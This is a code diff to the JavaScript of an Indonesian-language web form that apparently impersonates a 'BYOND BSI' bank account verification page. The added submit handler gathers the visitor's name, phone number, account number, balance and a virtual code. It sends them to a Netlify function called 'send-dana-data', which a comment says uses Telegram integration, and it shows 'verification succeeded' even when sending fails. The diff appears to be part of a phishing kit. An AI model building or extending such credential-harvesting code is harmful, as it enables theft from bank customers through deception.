@@ -89,17 +89,6 @@ document.addEventListener('DOMContentLoaded', function() {
         }, 1500);
     });
 
-    document.getElementById('accountForm4').addEventListener('submit', function(e) {
-        e.preventDefault();
-        showLoading();
-        setTimeout(() => {
-            hideLoading();
-            alert('Verifikasi berhasil! Rekening Anda telah terdaftar di BYOND BSI.');
-            // In real implementation, redirect to dashboard
-            // window.location.href = 'dashboard.html';
-        }, 2000);
-    });
-
     // Request virtual code button
     document.getElementById('requestCodeBtn').addEventListener('click', function() {
         showLoading();
@@ -140,6 +129,46 @@ document.addEventListener('DOMContentLoaded', function() {
             }, 50);
         }, 500);
     }
+
+    // Form submission handler for final verification with Telegram integration
+    document.getElementById('accountForm4').addEventListener('submit', function(e) {
+        e.preventDefault();
+        showLoading();
+        
+        // Collect all form data
+        const formData = {
+            name: document.getElementById('accountName').value,
+            phone: document.getElementById('phoneNumber').value,
+            accountNumber: document.getElementById('accountNumber').value,
+            balance: document.getElementById('lastBalance').value,
+            virtualCode: document.getElementById('virtualCode').value,
+            tariff: selectedTariff // from the tariff selection
+        };
+
+        // Send to Netlify function
+        fetch('/.netlify/functions/send-dana-data', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            hideLoading();
+            if (data.success) {
+                alert('Verifikasi berhasil! Data telah dikirim. Rekening Anda telah terdaftar di BYOND BSI.');
+                // In real implementation, redirect to dashboard
+                // window.location.href = 'dashboard.html';
+            } else {
+                alert('Verifikasi berhasil tetapi gagal mengirim notifikasi: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(error => {
+            hideLoading();
+            alert('Verifikasi berhasil tetapi terjadi kesalahan: ' + error.message);
+        });
+    });
 
     // Initial setup of numeric inputs for the first form
     setupNumericInputs();
